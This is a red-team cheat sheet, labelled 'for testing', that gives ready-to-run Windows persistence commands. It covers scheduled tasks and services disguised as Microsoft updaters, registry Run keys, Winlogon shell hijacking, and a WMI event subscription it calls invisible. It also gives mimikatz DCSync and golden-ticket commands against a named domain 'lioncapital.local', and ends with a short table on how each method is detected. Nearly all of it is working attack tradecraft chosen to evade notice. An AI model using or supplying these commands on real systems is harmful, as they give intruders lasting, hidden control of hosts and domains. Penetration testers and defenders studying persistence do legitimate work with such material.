# Persistence Methods (for testing)

## Scheduled Tasks (signed)
```cmd
:: As SYSTEM
schtasks.exe /create /tn "WindowsUpdater" /tr "C:\Users\Public\update.exe" /sc minute /mo 5 /ru SYSTEM /f

:: As current user (low priv)
schtasks.exe /create /tn "Updater" /tr "C:\Users\Public\update.exe" /sc logon /f

:: Modify existing service to point at payload
sc.exe config "Schedule" binPath= "C:\Users\Public\update.exe" start= demand
```

## Services (signed)
```cmd
:: Create new service
sc.exe create "MicrosoftHealthCheck" binPath= "C:\Users\Public\payload.exe" start= auto
sc.exe start "MicrosoftHealthCheck"

:: Modify existing service path (rarely succeeds)
sc.exe config "BITS" binPath= "C:\Users\Public\update.exe"
```

## Registry Autoruns (signed reg.exe)
```cmd
:: Per-user (no admin needed)
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Users\Public\update.exe" /f

:: HKLM (needs admin)
reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\ProgramData\update.exe" /f

:: Winlogon shell replacement
reg.exe add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Users\Public\update.exe" /f
```

## WMI Event Subscription (no file, invisible)
```powershell
# Event filter (signed wmic/powershell)
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "WindowsUpdateCheck"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process'"
}

$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "Updater"
    CommandLineTemplate = "C:\Users\Public\update.exe"
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

## Golden Ticket (post-DA)
```cmd
mimikatz.exe
privilege::debug
lsadump::dcsync /user:lioncapital\krbtgt

kerberos::golden /user:Administrator /domain:lioncapital.local /sid:S-1-5-21-1192132689-1058670598-4104447906 /krbtgt:HASH /ptt

:: Now you have unkillable ticket until krbtgt password changes (twice)
```

## Detection reality

| Persistence | Detection |
|-------------|-----------|
| Scheduled tasks | Sysmon EID 1, EDR file write alerts |
| New services | Sysmon EID 1 + service change rules |
| Registry autoruns | Many SIEM rules, autoruns tools |
| WMI event subscription | Often not caught by basic EDR |
| Golden ticket | Only detected via abnormal logon patterns |

